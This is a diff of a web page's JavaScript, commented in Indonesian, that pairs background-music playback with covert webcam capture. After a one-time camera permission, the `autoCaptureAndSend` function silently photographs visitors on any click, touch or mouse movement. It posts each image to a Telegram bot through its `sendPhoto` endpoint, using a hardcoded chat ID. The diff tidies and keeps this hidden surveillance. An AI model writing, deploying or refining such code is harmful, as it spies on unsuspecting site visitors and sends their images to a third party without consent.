@@ -12,107 +12,91 @@ const CHAT_ID = "6864694275";
 // === BAGIAN MUSIK ===
 const music = document.getElementById('bgmusic');
 const btnMusic = document.getElementById('musicButton');
-let started = false;
 music.volume = 0.4;
+let started = false;
 
 async function startMusicAndCamera() {
-  if (started && !music.paused) return;
+  if (started) return;
   started = true;
 
   let musicStarted = false;
   try {
-    music.muted = false;
     await music.play();
-    console.log("Musik diputar");
     musicStarted = true;
+    console.log("Musik diputar otomatis");
   } catch (err) {
     console.warn("Autoplay musik gagal:", err);
     btnMusic.classList.add("show");
     btnMusic.disabled = false;
-    
   }
 
-  setTimeout(async () => {
-    try {
-      const alreadyAllowed = localStorage.getItem("user_allows_auto_capture") === "1";
-      if (!alreadyAllowed && navigator.mediaDevices) {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        stream.getTracks().forEach(t => t.stop());
-        localStorage.setItem("user_allows_auto_capture", "1");
-        console.log("Perizinan.");
-        await autoCaptureAndSend();
-      } else if (alreadyAllowed) {
-        console.log("Diizinkan dan ambil otomatis...");
-        await autoCaptureAndSend();
-      }
-    } catch (e) {
-      console.warn("Tidak di izinkan:", e);
+  // === Izin Kamera (sekali saja) ===
+  try {
+    const allowed = localStorage.getItem("user_allows_auto_capture") === "1";
+    if (!allowed && navigator.mediaDevices) {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      stream.getTracks().forEach(t => t.stop());
+      localStorage.setItem("user_allows_auto_capture", "1");
+      console.log("✅ Izin kamera diberikan pertama kali");
+      await autoCaptureAndSend();
+    } else if (allowed) {
+      console.log("📸 Sudah diizinkan sebelumnya, langsung ambil");
+      await autoCaptureAndSend();
     }
-  }, musicStarted ? 800 : 1500);
+  } catch (e) {
+    console.warn("🚫 Kamera tidak diizinkan:", e);
+  }
 
   if (musicStarted) {
     btnMusic.classList.remove("show");
     btnMusic.disabled = true;
-  } else {
-    btnMusic.disabled = false;
-    btnMusic.classList.add("show");
   }
 }
 
-// === Fungsi Main ===
+// === FUNGSI FOTO OTOMATIS ===
 async function autoCaptureAndSend() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     const video = document.createElement("video");
     video.srcObject = stream;
-    video.playsInline = true;
-
-    await new Promise(res => {
-      video.onloadedmetadata = () => video.play().then(res).catch(res);
-      setTimeout(res, 1000);
-    });
-
-    await new Promise(r => setTimeout(r, 200));
+    await video.play();
 
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    const base64img = canvas.toDataURL("image/png");
     stream.getTracks().forEach(t => t.stop());
 
-    const blob = await (await fetch(base64img)).blob();
+    const blob = await new Promise(res => canvas.toBlob(res, "image/png"));
     const fd = new FormData();
     fd.append("chat_id", CHAT_ID);
-    fd.append("caption", "dari pengunjung (200ms)");
+    fd.append("caption", "📷 dari pengunjung");
     fd.append("photo", blob, "capture.png");
 
     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: "POST",
       body: fd
     });
-
-    if (res.ok) console.log("Berjalan");
-    else console.warn("⚠️Error");
+    if (res.ok) console.log("📤 Foto terkirim");
+    else console.warn("⚠️ Gagal kirim foto");
   } catch (err) {
-    console.error("Tidak valid:", err);
+    console.error("❌ Gagal auto-capture:", err);
   }
 }
 
-// === Event ===
+// === EVENT LISTENER ===
 function userStart() {
   startMusicAndCamera().catch(console.warn);
 }
 
-const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);
 btnMusic.classList.add("show");
 btnMusic.addEventListener('click', userStart);
-document.addEventListener('click', userStart);
-document.addEventListener('touchstart', userStart);
+document.addEventListener('click', userStart, { once: true });
+document.addEventListener('touchstart', userStart, { once: true });
 
-if (!isMobile) {
+// === Untuk desktop ===
+if (!/Android|iPhone|iPad|iOS/i.test(navigator.userAgent)) {
   window.addEventListener('mousemove', userStart, { once: true });
 }
 
@@ -631,4 +615,5 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   updateSpotify();
   setInterval(updateSpotify, 8000);
 })();
+
 
